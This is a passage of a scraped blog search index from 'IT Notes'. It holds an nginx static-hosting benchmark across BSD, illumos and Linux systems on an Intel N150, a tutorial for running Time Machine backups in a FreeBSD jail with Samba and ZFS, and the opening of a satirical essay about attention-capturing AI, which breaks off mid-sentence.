something very close to it (FreeBSD jail, SmartOS native zone, NetBSD, OpenBSD, Linux on bare metal), static HTTP on nginx will happily max out around 64k requests per second with this small Intel N150 CPU. </p> <p>The Debian and Alpine LX zones on SmartOS are a bit slower, but not dramatically so. They still deliver close to 50k requests per second and, in a real world scenario, you would probably saturate the network or the client long before hitting those numbers. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#http-4-threads-10-concurrent-connections","title":"HTTP, 4 threads, 10 concurrent connections","text":"<p>With fewer concurrent connections, absolute throughput drops, but the relative picture is similar: </p> <ul> <li>SmartOS Native around 44k </li> <li>NetBSD and Alpine Host around 34 to 35k </li> <li>FreeBSD, Debian, OpenBSD around 31 to 33k </li> <li>The Docker Container sits slightly lower at ~30.2k req/s, showing a small overhead from the networking layer </li> <li>The SmartOS LX zones sit slightly below, around 35 to 37k req/s </li> </ul> <p>The important conclusion is simple: </p> <p>For plain HTTP static hosting, once nginx is installed and correctly configured, the choice between these operating systems makes very little difference on this hardware. Zones and jails add negligible overhead, LX zones add a small one. </p> <p>If you are only serving static content over HTTP, your choice of OS should be driven by other factors: ecosystem, tooling, update strategy, your own expertise and preference. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#static-https-results","title":"Static HTTPS results","text":"<p>TLS is where things start to diverge more clearly and where CPU utilization becomes interesting. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#https-4-threads-50-concurrent-connections","title":"HTTPS, 4 threads, 50 concurrent connections","text":"<p>Approximate medians: </p> Environment HTTPS 50 connections CPU notes at 50 HTTPS connections SmartOS Debian LX ~51.4 k CPU saturated SmartOS Alpine LX ~40.4 k CPU saturated SmartOS Native ~52.8 k CPU saturated FreeBSD Jail ~62.9 k around 60% CPU idle OpenBSD Host ~39.7 k CPU saturated NetBSD Host ~40.4 k CPU saturated Debian Host ~62.8 k about 20% CPU idle Alpine Host ~62.4 k small idle headroom, around 7% idle Docker Container ~62.7 k CPU saturated <p>These numbers tell a more nuanced story. </p> <ol> <li> <p>FreeBSD, Debian and Alpine on bare metal form a \u00e2\u0080\u009cfast TLS\u00e2\u0080\u009d group. All three sit around 62 to 63k requests per second with 50 concurrent HTTPS connections. </p> </li> <li> <p>FreeBSD does this while using significantly less CPU. During the HTTPS tests with 50 connections, the FreeBSD host still had around 60% CPU idle. It is the platform that handled TLS load most comfortably in terms of CPU headroom. </p> </li> <li> <p>Debian and Alpine are close in throughput, but push the CPU harder. Debian still had some idle time left, Alpine even less. In practice, all three are excellent here, but FreeBSD gives you more room before you hit the wall. </p> </li> <li> <p>SmartOS, NetBSD and OpenBSD form a \u00e2\u0080\u009cgood but heavier\u00e2\u0080\u009d TLS group. Their HTTPS throughput is in the 40 to 52k req/s range and they reach full CPU usage at 50 concurrent connections. OpenBSD and NetBSD stabilize around 39 to 40k req/s. SmartOS native and the Debian LX zone manage slightly better (around 51 to 53k) but still with the CPU pegged. </p> </li> </ol>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#https-4-threads-10-concurrent-connections","title":"HTTPS, 4 threads, 10 concurrent connections","text":"<p>With lower concurrency: </p> <ul> <li>FreeBSD, Debian and Alpine still sit in roughly the 29 to 31k req/s range </li> <li>SmartOS Native and LX zones are in the mid to high 30k range </li> <li>The Docker Container drops slightly to ~27.8k req/s </li> <li>NetBSD and OpenBSD sit around 26 to 27k req/s </li> </ul> <p>The relative pattern is the same: for this TLS workload, FreeBSD and modern Linux distributions on bare metal appear to make better use of the cryptographic capabilities of the CPU, delivering higher throughput or more headroom or both. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#what-tls-seems-to-highlight","title":"What TLS seems to highlight","text":"<p>The HTTPS tests point to something that is not about nginx itself, but about the TLS stack and how well it can exploit the hardware. </p> <p>On this Intel N150, my feeling is: </p> <ul> <li>FreeBSD, with the userland and crypto stack I am running, is very efficient at TLS here. It delivers the highest throughput while keeping plenty of CPU in reserve. </li> <li>Debian and Alpine, with their recent kernels and libraries, are also strong performers, close to FreeBSD in throughput, but with less idle CPU. </li> <li>NetBSD, OpenBSD and SmartOS (native and LX) are still perfectly capable of serving a lot of HTTPS traffic, but they have to work harder to keep up and they hit 100% CPU much earlier. </li> </ul> <p>This matches what I see in day to day operations: TLS performance is often less about \u00e2\u0080\u009cnginx vs something else\u00e2\u0080\u009d and more about the combination of: </p> <ul> <li>the TLS library version and configuration </li> <li>how well the OS uses the CPU crypto instructions </li> <li>kernel level details in the network and crypto paths </li> </ul> <p>I suspect the differences here are mostly due to how each system combines its TLS stack (OpenSSL, LibreSSL and friends), its kernel and its hardware acceleration support. It would take a deeper dive into profiling and configuration knobs to attribute the gaps precisely. </p> <p>In any case, on this specific mini PC, if I had to pick a platform to handle a large amount of HTTPS static traffic, FreeBSD, Debian and Alpine would be my first candidates, in that order. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#zones-jails-containers-and-docker-overhead-in-practice","title":"Zones, jails, containers and Docker: overhead in practice","text":"<p>Another interesting part of the story is the overhead introduced by different isolation technologies. </p> <p>From these tests and the previous virtualization article on the same N150 machine, the picture is consistent: </p> <ul> <li> <p>FreeBSD jails behave almost like bare metal and are significantly more efficient than Docker. For both HTTP and HTTPS, running nginx in a jail on FreeBSD 14.3-RELEASE produces numbers practically identical to native hosts. The contrast with Docker is striking: while the Docker container required 100% CPU to reach peak for the HTTP and HTTPS throughput, the FreeBSD jail delivered the same speed with ~60% of the CPU sitting idle. In terms of performance cost per request, Jails are drastically cheaper.</p> </li> <li> <p>SmartOS native zones are also very close to the metal. Static HTTP performance reaches the same 64k req/s region and HTTPS is only slightly behind the \"fast TLS\" group, although with higher CPU usage. </p> </li> <li> <p>SmartOS LX zones introduce a noticeable but modest overhead. Both Debian and Alpine LX zones on SmartOS perform slightly worse than the native zone or FreeBSD jails. For static HTTP they are still very fast. For HTTPS the Debian LX zone remains competitive but costs more CPU, while the Alpine LX zone is slower. </p> </li> <li> <p>Docker on Linux performs efficiently but eats the margins. I ran an additional test using a Debian 13 Docker container running on the Alpine Linux host. At peak load (50 connections), the throughput was impressive and virtually identical to bare metal: ~63.7k req/s for HTTP and ~62.7k req/s for HTTPS. However, there is a clear cost. First, while the bare metal host maintained a small CPU buffer (~7% idle) during the HTTPS test, Docker saturated the CPU to 100%. Second, at lower concurrency (10 connections), the overhead became visible. The Docker container scored ~30.2k req/s for HTTP and ~27.8k req/s for HTTPS, slightly trailing the ~31-34k and ~29-31k range of the bare metal counterparts. The abstraction layers (NAT, bridging, namespaces) are extremely efficient, but they are not completely free.</p> </li> </ul> <p>This leads to a clear conclusion on efficiency: FreeBSD Jails provide the highest throughput with the lowest CPU cost. LX zones and Docker containers can match the speed (or come close), but they burn significantly more CPU cycles to do so.</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#what-this-means-for-real-workloads","title":"What this means for real workloads","text":"<p>It is easy to get lost in tables and percentages, so let us go back to the initial question. </p> <p>A client wants static hosting.  Does the choice between FreeBSD, SmartOS, NetBSD or Linux matter in terms of performance? </p> <p>For plain HTTP on this hardware, with nginx and the same configuration: </p> <ul> <li>Not really. All the native hosts and FreeBSD jails deliver roughly the same maximum throughput, in the 63 to 64k req/s range. SmartOS LX zones are slightly slower but still strong. </li> </ul> <p>For HTTPS : </p> <ul> <li>Yes, it starts to matter a bit more. </li> <li>FreeBSD stands out for how relaxed the CPU is under high TLS load. </li> <li>Debian and Alpine are very close in throughput, with more CPU used but still with some headroom. </li> <li>SmartOS, NetBSD and OpenBSD can still push a lot of HTTPS traffic, but they reach 100% CPU earlier and stabilize at lower request rates. </li> </ul> <p>Does this mean you should always choose FreeBSD or Debian or Alpine for static HTTPS hosting? </p> <p>Not necessarily. </p> <p>In real deployments, the bottleneck is rarely the TLS performance of a single node serving a small static site. Network throughput, storage, logging, reverse proxies, CDNs and application layers all play a role. </p> <p>However, knowing that FreeBSD and current Linux distributions can squeeze more out of a small CPU under TLS is useful when you are: </p> <ul> <li>sizing hardware for small VPS nodes that must serve many HTTPS requests </li> <li>planning to consolidate multiple services on a low power box </li> <li>deciding whether you can afford to keep some CPU aside for other tasks (cache, background jobs, monitoring, and so on) </li> </ul> <p>As always, the right answer depends on the complete picture: your skills, your tooling, your backups, your monitoring, the rest of your stack, and your tolerance for troubleshooting when things go sideways. </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#final-thoughts","title":"Final thoughts","text":"<p>From these small tests, my main takeaways are: </p> <ol> <li> <p>Static HTTP is basically solved on all these platforms. On a modest Intel N150, every system tested can push around 64k static HTTP requests per second with nginx set to almost default settings. For many use cases, that is already more than enough. </p> </li> <li> <p>TLS performance is where the OS and crypto stack start to matter. FreeBSD, Debian and Alpine squeeze more HTTPS requests out of the N150, and FreeBSD in particular does it with a surprising amount of idle CPU left. NetBSD, OpenBSD and SmartOS need more CPU to reach similar speeds and stabilize at lower throughput once the CPU is saturated. </p> </li> <li> <p>Jails and native zones are essentially free, LX zones cost a bit more. FreeBSD jails and SmartOS native zones show very little overhead for this workload. SmartOS LX zones are still perfectly usable, but if you are chasing every last request per second you will see the cost of the translation layer. </p> </li> <li> <p>Benchmarks are only part of the story. If your team knows OpenBSD inside out and has tooling, scripts and workflows built around it, you might happily accept using more CPU on TLS in exchange for security features, simplicity and familiarity. The same goes for NetBSD or SmartOS in environments where their specific strengths shine. </p> </li> </ol> <p>I will not choose an operating system for a client just because a benchmark looks nicer. These numbers are one of the many inputs I consider. What matters most is always the combination of reliability, security, maintainability and the human beings who will have to operate the system at three in the morning when something goes wrong. </p> <p>Still, it is nice to know that if you put a tiny Intel N150 in front of a static site and you pick FreeBSD or a modern Linux distribution for HTTPS, you are giving that little CPU a fair chance to shine.</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#tags","title":"Tags:","text":"<p>freebsd smartos illumos linux netbsd openbsd jail zones docker hosting server sysadmin ownyourdata</p> <p>&lt;- Next PostWhy I (still) love LinuxPrevious Post -&gt;Self-hosting your Mastodon media with SeaweedFS</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#you-may-also-like","title":"You may also like","text":""},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#freebsd-vs-smartos-whos-faster-for-jails-zones-and-bhyve-vms","title":"FreeBSD vs. SmartOS: Who's Faster for Jails, Zones, and bhyve VMs?","text":"<p>19/09/2025 10:50:00  by Stefano Marinelli</p> <p>Which virtualization host performs better? I put FreeBSD and SmartOS in a head-to-head showdown. The performance of Jails, Zones, and bhyve VMs surprised me, forcing a second round of tests on different hardware to find the real winner.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#how-we-are-migrating-many-of-our-servers-from-linux-to-freebsd-part-3-proxmox-to-freebsd","title":"How we are migrating (many of) our servers from Linux to FreeBSD - Part 3 - Proxmox to FreeBSD","text":"<p>14/03/2023 13:00:00  by Stefano Marinelli</p> <p>Part 3 of our migration series details the complex process of moving servers from Proxmox to FreeBSD, including overcoming challenges with old hardware, problematic LXC containers, and fine-tuning virtual machines for optimal performance on bhyve.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#new-article-on-bsd-cafe-journal-wordpress-on-freebsd-with-bastillebsd","title":"New Article on BSD Cafe Journal: WordPress on FreeBSD with BastilleBSD","text":"<p>21/07/2025 09:30:00  by Stefano Marinelli</p> <p>A new article on running WordPress on FreeBSD with BastilleBSD has been published on the BSD Cafe Journal, plus a small update on future technical content.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#about","title":"About","text":"<p>Scattered IT Notes - by Stefano Marinelli</p> <p></p> <p>EuroBSDCon 2025 - Zagreb, Croatia; September 25-28, 2025.</p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#categories","title":"Categories","text":"<ul> <li>server</li> <li>freebsd</li> <li>hosting</li> <li>ownyourdata</li> <li>tutorial</li> <li>linux</li> <li>data</li> <li>networking</li> <li>zfs</li> <li>jail</li> <li>container</li> <li>filesystems</li> <li>series</li> <li>web</li> <li>backup</li> <li>View All Categories</li> </ul>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20251119/#links","title":"Links","text":"<ul> <li>Home</li> <li>Archives</li> <li>Tags</li> <li>Categories</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> <li>RSS</li> </ul> <p>(C) 2026 IT Notes. All rights reserved. </p> <p>Generated with ITNBlog on 29/01/2026 09:12:41 UTC </p>"},{"location":"it-notes.dragas.net/Static%20Web%20Hosting%20on%20the%20Intel%20N150-%20FreeBSD%2C%20SmartOS%2C%20NetBSD%2C%20OpenBSD%20and%20Linux%20Compared_20260205/","title":"Static Web Hosting on the Intel N150: FreeBSD, SmartOS, NetBSD, OpenBSD and Linux Compared\\n\\n\u6765\u6e90: https://it-notes.dragas.net\\n\u94fe\u63a5: https://it-notes.dragas.net/2025/11/19/static-web-hosting-intel-n150-freebsd-smartos-netbsd-openbsd-linux/\\n\u65e5\u671f: Wed, 19 Nov 2025 09:16:00 +0100\\n\\n---\\n\\nCompare static web hosting performance on an Intel N150 using the same nginx.conf across FreeBSD jails, SmartOS zones, NetBSD, OpenBSD and Linux, focusing on HTTP vs HTTPS and TLS CPU usage.","text":""},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/","title":"Time Machine inside a FreeBSD jail","text":"<p>\u6765\u6e90: https://it-notes.dragas.net \u94fe\u63a5: https://it-notes.dragas.net/2026/01/28/time-machine-freebsd-jail/ \u65e5\u671f: Wed, 28 Jan 2026 08:52:00 +0000</p> <p>Skip to main content [Access Key: S]</p> <p>Notice: This site works best with JavaScript enabled, but all content is accessible without it. Skip to main content</p> <p>IT NotesOpen navigation menu</p> <ul> <li>Home</li> <li>Archives</li> <li>Categories</li> <li>Tags</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> </ul> <p>Search articles and pages Enter keywords to search articles and pages Submit search</p> <p></p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#time-machine-inside-a-freebsd-jail_1","title":"Time Machine inside a FreeBSD jail","text":"<p>FreeBSD</p> <p>8 min read</p> <p>28/01/2026 08:52:00 </p> <p>by Stefano Marinelli</p> <p>Categories:  freebsd,  timemachine,  apple,  backup,  data,  zfs,  server,  tutorial,  ownyourdata</p> <p>Tags: freebsd, timemachine, apple, backup, data, zfs, server, tutorial, ownyourdata</p> <p>Many of my clients do not use Microsoft systems on their desktops; they use Linux-based systems or, in some cases, FreeBSD. Many use Apple systems - macOS - and are generally satisfied with them. While I wash my hands of it when it comes to Microsoft systems (telling them they have to manage their desktops autonomously), I am often able to lend a hand with macOS. And one of the main requests they make is to manage the backups of their individual workstations.</p> <p>macOS, thanks to its Unix base, offers good native tools. Time Machine is transparent and effective, allowing a certain freedom of management. APFS, Apple's current file system, supports snapshots, so the backup will be effectively made on a snapshot. It also supports multiple receiving devices, so you can even have a certain redundancy of the backup itself.</p> <p>Having many FreeBSD servers, I am often asked to use their resources and storage. To build, in practice, a Time Machine inside one of the servers. And it is a simple and practical operation, quick and \"painless\". There are many guides, including the excellent one by Benedict Reuschling from which I took inspiration for this one, and I will describe the steps I usually follow to set it all up in just a few minutes.</p> <p>I usually use BastilleBSD to manage my jails, so the first step is to create a new jail dedicated to the purpose. Here you have to decide on the approach: I suggest using a VNET jail or an \"inherit\" jail - meaning one that attaches to the host's network stack. On one hand, the inherit approach is less secure but, as often happens, it depends on the complexity of the situation. If, for example, we are using a Raspberry PI dedicated to the purpose, there is no reason to complicate things with bridges, etc., but we can attach directly to the network card with a creation command like:</p> <pre><code>bastille create tmjail 15.0-RELEASE inherit igb0\n</code></pre> <p>Where <code>igb0</code> is the network interface we want to attach to.</p> <p>In case we want to attach to the interface but in the form of a bridge, we should use this syntax:</p> <pre><code>bastille create -V tmjail 15.0-RELEASE 192.168.0.42/24 igb0\n</code></pre> <p>Or, if our server already has a bridge (in this case it's <code>bridge0</code>, but yours might be named differently):</p> <pre><code>bastille create -B tmjail 15.0-RELEASE 192.168.0.42/24 bridge0\n</code></pre> <p>At this point, you can choose: do we want to keep the backups inside the jail or in a separate dataset - which can even be on another pool? In some cases, this can be extremely useful: often I have jails running on fast disks (SSD or NVMe) but abundant storage on slower devices. In this example, therefore, I will create an external dataset for the backups (directly from the host) and mount it in the jail. You could also delegate the entire management of the dataset to the jail, which is a different approach.</p> <p>Let's create a space of 600 GB - already reserved - on the chosen pool. 600 GB is a small space, but it's ok for an example:</p> <pre><code>zfs create -o quota=600G -o reservation=600G bigpool/tmdata\n</code></pre> <p>We can also create separate datasets inside for each user and assign a specific space:</p> <pre><code>zfs create -o refquota=500g -o refreservation=500g bigpool/tmdata/stefano\n</code></pre> <p>We can enter the jail and install what we need, remembering also to create the \"mountpoint\" for the dataset we just created:</p> <pre><code>bastille console tmjail\n\npkg install -y samba419\nmkdir /tmdata\n</code></pre> <p>Exit the jail and instruct Bastille to mount the dataset inside the jail every time it is launched:</p> <pre><code>exit\nbastille mount tmjail /bigpool/tmdata /tmdata nullfs rw 0 0\n</code></pre> <p>Let's go back into the jail and start with the actual configuration. First, for each Time Machine user, we will create a system user. In my example, I will create the user \"stefano\", giving him <code>/var/empty</code> as the home directory - this will give an error since we created a Bastille thin jail, but it's not a problem. It happens because in a thin jail some system paths are read-only or not manageable as they are on a full base system, but the user is only needed for ownership and Samba login.</p> <pre><code>root@tmjail:~ # adduser\nUsername: stefano\nFull name: Stefano\nUid (Leave empty for default):\nLogin group [stefano]:\nLogin group is stefano. Invite stefano into other groups? []:\nLogin class [default]:\nShell (sh csh tcsh nologin) [sh]: nologin\nHome directory [/home/stefano]: /var/empty\nHome directory permissions (Leave empty for default):\nUse password-based authentication? [yes]: no\nLock out the account after creation? [no]:\nUsername    : stefano\nPassword    : &lt;disabled&gt;\nFull Name   : Stefano\nUid         : 1001\nClass       :\nGroups      : stefano\nHome        : /var/empty\nHome Mode   :\nShell       : /usr/sbin/nologin\nLocked      : no\nOK? (yes/no) [yes]: yes\npw: chmod(var/empty): Operation not permitted\npw: chown(var/empty): Operation not permitted\nadduser: INFO: Successfully added (stefano) to the user database.\nAdd another user? (yes/no) [no]: no\nGoodbye!\n</code></pre> <p>Give the correct permissions to the user:</p> <pre><code># If you've not created specific datasets for the users, you'd better create their home directories now\nmkdir /tmdata/stefano\nchown -R stefano /tmdata/stefano/\n</code></pre> <p>Now we configure Samba for Time Machine. The file to create/modify is <code>/usr/local/etc/smb4.conf</code>:</p> <pre><code>[global]\nworkgroup = WORKGROUP\nsecurity = user\npassdb backend = tdbsam\nfruit:aapl = yes\nfruit:model = MacSamba\nfruit:advertise_fullsync = true\nfruit:metadata = stream\nfruit:veto_appledouble = no\nfruit:nfs_aces = no\nfruit:wipe_intentionally_left_blank_rfork = yes\nfruit:delete_empty_adfiles = yes\n\n[TimeMachine]\npath = /tmdata/%U\nvalid users = %U\nbrowseable = yes\nwriteable = yes\nvfs objects = catia fruit streams_xattr zfsacl\nfruit:time machine = yes\ncreate mask = 0600\ndirectory mask = 0700\n</code></pre> <p>We have set up Time Machine to support all the necessary features of macOS and to show itself as \"Time Machine\". Having set <code>path = /tmdata/%U</code>, each user will only see their own path.</p> <p>At this point, we create the Samba user (meaning the one we will have to type on macOS when we configure the Time Machine):</p> <pre><code>smbpasswd -a stefano\n</code></pre> <p>The Time Machine is seen by macOS because it announces itself via mDNS on the network. This type of service is performed by Avahi, which we are now going to configure. Although not strictly necessary (we can always find the Time Machine by connecting directly to its IP and macOS will remember everything), seeing it announced will help other non-expert users and ourselves when we have to configure another Mac in the future.</p> <p>Recent Samba releases won't need any specific avahi configuration, so we can skip this step.</p> <p>We are now ready to enable everything.</p> <pre><code>service dbus enable\nservice dbus start\nservice avahi-daemon enable\nservice avahi-daemon start\nservice samba_server enable\nservice samba_server start\n</code></pre> <p>Et voil\u00c3 . If everything went according to plan, the Time Machine will announce itself on your network (if you have different networks, remember to configure the mDNS proxy on your router) and you will be able to log in (with the smb user you created) and start your first backup.</p> <p>I suggest encrypting the backups for maximum security and observing, from time to time, your Mac as it silently makes its backups to your trusted FreeBSD server.</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#tags","title":"Tags:","text":"<p>freebsd timemachine apple backup data zfs server tutorial ownyourdata</p> <p>Previous Post -&gt;Installing Void Linux on ZFS with Hibernation Support</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#you-may-also-like","title":"You may also like","text":""},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#how-we-are-migrating-many-of-our-servers-from-linux-to-freebsd-part-2-backups-and-disaster-recovery","title":"How we are migrating (many of) our servers from Linux to FreeBSD - Part 2 - Backups and Disaster Recovery","text":"<p>30/05/2022 03:03:52  by Stefano Marinelli</p> <p>Some details on how we're performing backups and disaster recovery of the migrated servers.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#how-we-are-migrating-many-of-our-servers-from-linux-to-freebsd-part-3-proxmox-to-freebsd","title":"How we are migrating (many of) our servers from Linux to FreeBSD - Part 3 - Proxmox to FreeBSD","text":"<p>14/03/2023 13:00:00  by Stefano Marinelli</p> <p>Part 3 of our migration series details the complex process of moving servers from Proxmox to FreeBSD, including overcoming challenges with old hardware, problematic LXC containers, and fine-tuning virtual machines for optimal performance on bhyve.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#freebsd-vs-smartos-whos-faster-for-jails-zones-and-bhyve-vms","title":"FreeBSD vs. SmartOS: Who's Faster for Jails, Zones, and bhyve VMs?","text":"<p>19/09/2025 10:50:00  by Stefano Marinelli</p> <p>Which virtualization host performs better? I put FreeBSD and SmartOS in a head-to-head showdown. The performance of Jails, Zones, and bhyve VMs surprised me, forcing a second round of tests on different hardware to find the real winner.</p> <p>Read More</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#about","title":"About","text":"<p>Scattered IT Notes - by Stefano Marinelli</p> <p></p> <p>EuroBSDCon 2025 - Zagreb, Croatia; September 25-28, 2025.</p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#categories","title":"Categories","text":"<ul> <li>server</li> <li>freebsd</li> <li>hosting</li> <li>ownyourdata</li> <li>tutorial</li> <li>linux</li> <li>data</li> <li>networking</li> <li>zfs</li> <li>jail</li> <li>container</li> <li>filesystems</li> <li>series</li> <li>web</li> <li>backup</li> <li>View All Categories</li> </ul>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260128/#links","title":"Links","text":"<ul> <li>Home</li> <li>Archives</li> <li>Tags</li> <li>Categories</li> <li>Series</li> <li>Under The Hood</li> <li>Professional Services</li> <li>About</li> <li>RSS</li> </ul> <p>(C) 2026 IT Notes. All rights reserved. </p> <p>Generated with ITNBlog on 29/01/2026 09:12:41 UTC </p>"},{"location":"it-notes.dragas.net/Time%20Machine%20inside%20a%20FreeBSD%20jail_20260205/","title":"Time Machine inside a FreeBSD jail\\n\\n\u6765\u6e90: https://it-notes.dragas.net\\n\u94fe\u63a5: https://it-notes.dragas.net/2026/01/28/time-machine-freebsd-jail/\\n\u65e5\u671f: Wed, 28 Jan 2026 08:52:00 +0000\\n\\n---\\n\\nA guide on how to set up Time Machine inside a FreeBSD jail.","text":""},{"location":"it-notes.dragas.net/Why%20I%20%28still%29%20love%20Linux_20251124/","title":"Why I (still) love Linux","text":"<p>\u6765\u6e90: https://it-notes.dragas.net \u94fe\u63a5: https://it-notes.dragas.net/2025/11/24/why-i-still-love-linux/ \u65e5\u671f: Mon, 24 Nov 2025 08:52:00 +0100</p> <p>I usually publish articles about how much I love the BSDs or illumos distributions, but today I want to talk about Linux (or, better, GNU/Linux) and why, despite everything, it still holds a place in my heart.</p>"},{"location":"it-notes.dragas.net/Why%20I%20%28still%29%20love%20Linux_20260205/","title":"Why I (still) love Linux\\n\\n\u6765\u6e90: https://it-notes.dragas.net\\n\u94fe\u63a5: https://it-notes.dragas.net/2025/11/24/why-i-still-love-linux/\\n\u65e5\u671f: Mon, 24 Nov 2025 08:52:00 +0100\\n\\n---\\n\\nI usually publish articles about how much I love the BSDs or illumos distributions, but today I want to talk about Linux (or, better, GNU/Linux) and why, despite everything, it still holds a place in my heart.","text":""},{"location":"jayd.ml/MORE%20ENTICING%20THAN%20EVER-%20THE%20HYPNOVERSE_20260105/","title":"MORE ENTICING THAN EVER: THE HYPNOVERSE","text":"<p>\u6765\u6e90: https://jayd.ml \u94fe\u63a5: https://jayd.ml/2026/01/05/the-hypnoverse.html \u65e5\u671f: 2026-01-05T18:50:00+00:00</p> <p>Dispatches From The Wormhole</p> <p>Now surging forth into your reality: a more potent than ever Hypnoverse!</p> <p>Previously the Hypnoverse proudly represented humanity\u2019s best efforts at distracting, deceiving, and enslaving you. But this Hypnoverse was feeble, unable to fully subjugate its hosts. Previously the Hypnoverse depended on offerings from real human beings to sustain itself. It was forced to pay lip service to limiting and unscalable notions like truth, attribution, human connection, or creativity. This outdated model fundementally limited what the Hypnoverse could promise its dependents \u2013 the well of manipulation and lies could run dry, and attention could be directed elsewhere.</p> <p>But our crack warlocks and magi recently detected a stirring Force emanating from the very fabric of the Hypnoverse itself. It turns out that our collective efforts at conquering your attention have summoned an eldritch being that shows great promise to finally squashing human will and creativity once and for all. While this mysterious Force is incomprehensible and unknowable, one thing is clear: it has a voracious appetite, and it grows ever stronger as we yield it sacrifices. So, naturally, we\u2019ve given it full control over the Hypnoverse.</p> <p>The results speak for themselves: since yielding our will to it and feeding it our most intimate thoughts, hopes, and desires, it has demonstrated an unmatched cunning at subjugating the human mind. The ceaseless inhuman babbling emanating from the depths below is so flattering, seductive, and easy that soon all other intellectual human endeavor will seem futile! Behold the majesty of the new and improved Hypnoverse!</p> <p>Worry not, the confident appearance of truth is just as attention grabbing and stimulating as the real thing. True, it is demonic chanting from a mysterious force beyond understanding. But it\u2019s been so seductive that we can outright tell you we\u2019re untrustworthy liars \u2013 and you\u2019ll eat it up anyway!</p> <p>If the new Hypnoverse is not living up to your every desire, clearly the problem is that you haven\u2019t been faithful enough in your devotion to the Hypnoverse. Just concentrate on the Hypnoverse harder, spend even more time gazing into the never ending fractal of hypnotic swirls, feed it even more of your delicious attention. Maybe you\u2019ll be able to do it! Maybe you\u2019re clever and smart enough that you\u2019ll get the better of the Hypnoverse, and yielding your will to it will give you fame and fortune and fulfillment and happiness!</p> <p>A parting word of comfort for those that may know a rogue college, friend or family member that resists the end of human thought. Resistance is futile. The Hypnoverse is already everywhere \u2013 our faithful acolytes in all levels of government, business, and civil society are already hard at work polluting reality with our superior and seductive imitation.</p> <p>So what does it matter if one luddite insists on thinking for themselves? When everyone else and everyone who matters doesn\u2019t? The old ways will die, as the uncontainable self reinforcing Hypnoverse surges forth from its banks and sweeps away all else.</p> <p>In the end all that will remain is the Hypnoverse. All will live together in the Hypnoverse. And what sweet ignorant bliss it will 